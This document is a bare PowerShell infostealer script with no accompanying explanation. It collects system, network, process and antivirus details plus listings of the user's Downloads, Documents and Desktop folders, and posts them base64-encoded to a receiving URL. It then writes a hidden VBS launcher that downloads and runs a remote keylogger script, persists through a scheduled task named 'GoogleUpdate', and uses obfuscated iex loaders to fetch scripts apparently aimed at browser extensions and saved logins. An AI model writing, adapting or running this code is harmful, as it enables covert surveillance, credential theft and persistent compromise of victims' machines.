$srsdf='http://localhost/receive.php' 

function GetFile() {
	param (
		$mytar,
		$name
	)
	Write-Output $name
	$dhd=[IO.File]::readallbytes($mytar);
	$kfjh=[System.Convert]::ToBase64String($dhd);
	$kfjh=[regex]::Replace($kfjh,'=','%');
	$msgin='access='+$kfjh+'&name='+$name;
	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
}

$da = "{0:yyyyMMddHHmmss}" -f (Get-Date)
$filename = "$env:appdata\koala_$da"

$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
$ic = ipconfig /all
$gp=Get-process
$sy = systeminfo
$antivirusInfo = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct
$anvi = $antivirusInfo | Select-Object DisplayName, ProductState, PathToSignedProductExe
Write-Output $anvi

ac $filename $rc -Encoding 'utf8'
ac $filename $ic
ac $filename $gp
ac $filename $sy
ac $filename $anvi

$name = "info.log"

GetFile $filename $name

del $filename

$down = "$env:Appdata\down.txt"
$docu = "$env:Appdata\docu.txt"
$desk = "$env:Appdata\desk.txt"
dir "$env:userprofile\Downloads" -depth 10 >> $down
dir "$env:userprofile\Documents" -depth 10 >> $docu
dir "$env:userprofile\Desktop" -depth 10 >> $desk
GetFile $down "down.txt"
GetFile $docu "docu.txt"
GetFile $desk "desk.txt"

del $down
del $docu
del $desk

function Set_bootACL($filepath)
{
	attrib +S +H $filepath
}

$paFile = $env:appdata + '\setupact.vbs'
$content = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -Command ""`$nbvccxxx = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/smrroot/shell_routine/refs/heads/main/key_logger.ps1'); `$qweewqqq = `$nbvccxxx.Replace('afhelfvx', ''); `$zxdsxxxxcc = IEX `$qweewqqq; Invoke-Expression `$zxdsxxxxcc;""", 0, True
"@
Set-Content -Path $paFile -Value $content -Encoding ASCII

Set_bootACL($paFile)
wscript.exe $paFile
schtasks /create /tn "GoogleUpdate" /tr "$paFile" /sc daily /st 14:30 /f

# schtasks /create /tn "koauSche" /tr "$paFile" /sc onlogon
function Z1p-P4ck {
	param (
		[string]$zZZz
	)
	$oOoO = $zZZz.Replace('wxffedd', '')
	$okoO = $oOoO.Replace('amwhatkl', 't')
	$zOxd=iex $okoO;
	Invoke-Expression $zOxd
}
$pqWq = {(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/shell_routine/refs/heads/main/extension.ps1')};
$xXyY = {(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/shell_routine/refs/heads/main/login_data.ps1')};

Z1p-P4ck -zZZz $pqWq
Z1p-P4ck -zZZz $xXyY